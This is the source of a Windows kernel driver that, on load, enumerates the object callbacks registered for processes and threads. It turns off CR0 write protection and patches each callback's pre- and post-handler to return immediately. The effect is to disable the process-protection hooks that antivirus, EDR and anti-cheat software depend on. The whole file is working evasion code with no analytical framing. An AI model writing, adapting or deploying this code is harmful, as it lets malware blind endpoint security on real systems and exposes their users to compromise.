#include <intrin.h.>
#include <ntifs.h>
#include <wdm.h>
#include <ntddk.h>

BOOLEAN EnumProcessObCallback();
BOOLEAN EnumThreadObCallback();
NTSTATUS RemoveObCallback(PVOID RegistrationHandle);

typedef struct _OBJECT_TYPE_INITIALIZER
{
    USHORT Length;                      // Uint2B
    UCHAR ObjectTypeFlags;              // UChar
    ULONG ObjectTypeCode;               // Uint4B
    ULONG InvalidAttributes;            // Uint4B
    GENERIC_MAPPING GenericMapping;     // _GENERIC_MAPPING
    ULONG ValidAccessMask;              // Uint4B
    ULONG RetainAccess;                 // Uint4B
    POOL_TYPE PoolType;                 // _POOL_TYPE
    ULONG DefaultPagedPoolCharge;       // Uint4B
    ULONG DefaultNonPagedPoolCharge;    // Uint4B
    PVOID DumpProcedure;                // Ptr64     void
    PVOID OpenProcedure;                // Ptr64     long
    PVOID CloseProcedure;               // Ptr64     void
    PVOID DeleteProcedure;              // Ptr64     void
    PVOID ParseProcedure;               // Ptr64     long
    PVOID SecurityProcedure;            // Ptr64     long
    PVOID QueryNameProcedure;           // Ptr64     long
    PVOID OkayToCloseProcedure;         // Ptr64     unsigned char
#if (NTDDI_VERSION >= NTDDI_WINBLUE)    // Win8.1
    ULONG WaitObjectFlagMask;           // Uint4B
    USHORT WaitObjectFlagOffset;        // Uint2B
    USHORT WaitObjectPointerOffset;     // Uint2B
#endif
} OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;

typedef struct _OBJECT_TYPE
{
    LIST_ENTRY TypeList;                 // _LIST_ENTRY
    UNICODE_STRING Name;                 // _UNICODE_STRING
    PVOID DefaultObject;                 // Ptr64 Void
    UCHAR Index;                         // UChar
    ULONG TotalNumberOfObjects;          // Uint4B
    ULONG TotalNumberOfHandles;          // Uint4B
    ULONG HighWaterNumberOfObjects;      // Uint4B
    ULONG HighWaterNumberOfHandles;      // Uint4B
    OBJECT_TYPE_INITIALIZER TypeInfo;    // _OBJECT_TYPE_INITIALIZER
    EX_PUSH_LOCK TypeLock;               // _EX_PUSH_LOCK
    ULONG Key;                           // Uint4B
    LIST_ENTRY CallbackList;             // _LIST_ENTRY
} OBJECT_TYPE, *POBJECT_TYPE;

#pragma pack(1)
typedef struct _OB_CALLBACK
{
    LIST_ENTRY ListEntry;
    ULONGLONG Unknown;
    HANDLE ObHandle;
    PVOID ObTypeAddr;
    PVOID PreCall;
    PVOID PostCall;
} OB_CALLBACK, *POB_CALLBACK;
#pragma pack()


VOID ShowError(PCHAR lpszText, NTSTATUS ntStatus)
{
    DbgPrint("%s Error[0x%X]\n", lpszText, ntStatus);
}

KIRQL WPOFFx64()
{
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    UINT64 cr0 = __readcr0();
    cr0 &= 0xfffffffffffeffff;
    __writecr0(cr0);
    _disable();
    return irql;
}

void WPONx64(KIRQL irql)
{
    UINT64 cr0 = __readcr0();
    cr0 |= 0x10000;
    _enable();
    __writecr0(cr0);
    KeLowerIrql(irql);
}

NTSTATUS RemoveObCallback(PVOID RegistrationHandle)
{
    ObUnRegisterCallbacks(RegistrationHandle);

    return STATUS_SUCCESS;
}

VOID PatchedObcallbacks(PVOID Address)
{
    KIRQL irql;
    CHAR patchCode[] = "\x33\xC0\xC3";    // xor eax,eax + ret
    if (!Address)
        return;
    if (MmIsAddressValid(Address))
    {
        irql = WPOFFx64();
        memcpy(Address, patchCode, 3);
        WPONx64(irql);
    }
}

//¦CÁ| callback (process)
BOOLEAN EnumProcessObCallback()
{
    POB_CALLBACK pObCallback = NULL;

    LIST_ENTRY CallbackList = ((POBJECT_TYPE)(*PsProcessType))->CallbackList;

    pObCallback = (POB_CALLBACK)CallbackList.Flink;
    do
    {
        if (FALSE == MmIsAddressValid(pObCallback))
        {
            break;
        }
        if (NULL != pObCallback->ObHandle)
        {
            DbgPrint("[PsProcessType]pObCallback->ObHandle = 0x%p\n", pObCallback->ObHandle);
            DbgPrint("[PsProcessType]pObCallback->PreCall = 0x%p\n", pObCallback->PreCall);
            DbgPrint("[PsProcessType]pObCallback->PostCall = 0x%p\n", pObCallback->PostCall);
            PatchedObcallbacks(pObCallback->PreCall);
            PatchedObcallbacks(pObCallback->PostCall);
            DbgPrint("[Patch] pObCallback->PreCall= 0x%p  Success\n", pObCallback->PreCall);
        }
        pObCallback = (POB_CALLBACK)pObCallback->ListEntry.Flink;

    } while (CallbackList.Flink != (PLIST_ENTRY)pObCallback);

    return TRUE;
}

BOOLEAN EnumThreadObCallback()
{
    POB_CALLBACK pObCallback = NULL;

    LIST_ENTRY CallbackList = ((POBJECT_TYPE)(*PsThreadType))->CallbackList;
    pObCallback = (POB_CALLBACK)CallbackList.Flink;
    do
    {
        if (FALSE == MmIsAddressValid(pObCallback))
        {
            break;
        }
        if (NULL != pObCallback->ObHandle)
        {
            DbgPrint("[PsThreadype]pObCallback->ObHandle = 0x%p\n", pObCallback->ObHandle);
            DbgPrint("[PsThreadType]pObCallback->PreCall = 0x%p\n", pObCallback->PreCall);
            DbgPrint("[PsThreadType]pObCallback->PostCall = 0x%p\n", pObCallback->PostCall);
            PatchedObcallbacks(pObCallback->PreCall);
            PatchedObcallbacks(pObCallback->PostCall);
            DbgPrint("[Remove] pObCallback->PreCall= 0x%p  Success\n", pObCallback->PreCall);
        }
        pObCallback = (POB_CALLBACK)pObCallback->ListEntry.Flink;

    } while (CallbackList.Flink != (PLIST_ENTRY)pObCallback);

    return TRUE;
}


VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
    UNREFERENCED_PARAMETER(pDriverObject);
}

NTSTATUS DriverDefaultHandle(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
    NTSTATUS status = STATUS_SUCCESS;
    UNREFERENCED_PARAMETER(pDevObj);
    pIrp->IoStatus.Status = status;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return status;
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)
{
    DbgPrint("Enter DriverEntry\n");
    UNREFERENCED_PARAMETER(pRegPath);
    NTSTATUS status = STATUS_SUCCESS;
    pDriverObject->DriverUnload = DriverUnload;
    for (ULONG i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
    {
        pDriverObject->MajorFunction[i] = DriverDefaultHandle;
    }

    EnumProcessObCallback();
    EnumThreadObCallback();

    DbgPrint("Leave DriverEntry\n");
    return status;
}
